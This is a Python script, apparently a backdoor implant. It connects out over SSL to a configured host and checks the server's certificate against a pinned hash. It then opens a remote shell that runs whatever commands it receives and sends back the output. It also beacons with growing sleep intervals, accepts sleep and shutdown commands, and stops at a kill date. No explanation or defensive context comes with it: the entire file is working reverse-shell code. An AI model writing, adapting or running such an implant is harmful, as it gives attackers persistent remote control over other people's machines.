#!/usr/bin/env python
import socket
import ssl
import hashlib
import subprocess
import time
import struct

PORT = 443
HOST = 'localhost'
CERT_HASH = 'f146e9f45d116241e0dabf1cd25905fa28d16f53'
PREAMBLE = '1010101010101010101010101010101010101010101010101010101010101011'
EXPIRE = '2016-01-01'
SLEEPMAX = 3600
seconds = 0


def _exec(commands):
    try:
        output = subprocess.check_output(commands, stderr=subprocess.STDOUT, shell=True)
        if output == '':
            output = ' '
        return output
    except subprocess.CalledProcessError as e:
        return "ERROR: CalledProcessError - {}".format(e)
    except OSError as e:
        return "ERROR: OSError - {}".format(e.args)


def launch_shell(stream):
    global seconds
    seconds = 0
    while True:
        data = stream.read()
        if not data:
            return True
        if data == '!shutdown':
            return False
        elif data.startswith('!sleep'):
            shutdown_connection(stream)
            duration = data.split()[1]
            time.sleep(int(duration) * 60)
            return True
        else:
            cmd_out = _exec(data)
            msg = struct.pack('>I', len(cmd_out)) + cmd_out
            stream.write(msg)


def verify_cert(ssl_sock):
    try:
        cert = ssl_sock.getpeercert(binary_form=True)
    except AttributeError:
        return False
    if CERT_HASH == hashlib.sha1(cert).hexdigest():
        return True
    else:
        return False


def shutdown_connection(ssl_stream):
    if ssl_stream is None:
        pass
    else:
        try:
            ssl_stream.shutdown(socket.SHUT_RDWR)
            ssl_stream.close()
        except socket.error:
            pass


def hibernate():
    global seconds
    if time.strftime('%Y-%m-%d') >= EXPIRE:
        exit()
    time.sleep(seconds)
    if seconds >= SLEEPMAX:
        pass
    else:
        seconds += 15


def get_connection():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_stream = ssl.wrap_socket(sock, ca_certs='server.crt', cert_reqs=ssl.CERT_REQUIRED)
        ssl_stream.connect((HOST, PORT))
        return ssl_stream
    except socket.error:
        return None


def main():
    stay_alive = True
    while stay_alive is True:
        hibernate()
        try:
            ssl_stream = get_connection()
            if ssl_stream is None:
                pass
            elif verify_cert(ssl_stream) is True:
                ssl_stream.write(PREAMBLE)
                stay_alive = launch_shell(ssl_stream)
                shutdown_connection(ssl_stream)
        except Exception:
            pass

if __name__ == '__main__':
    main()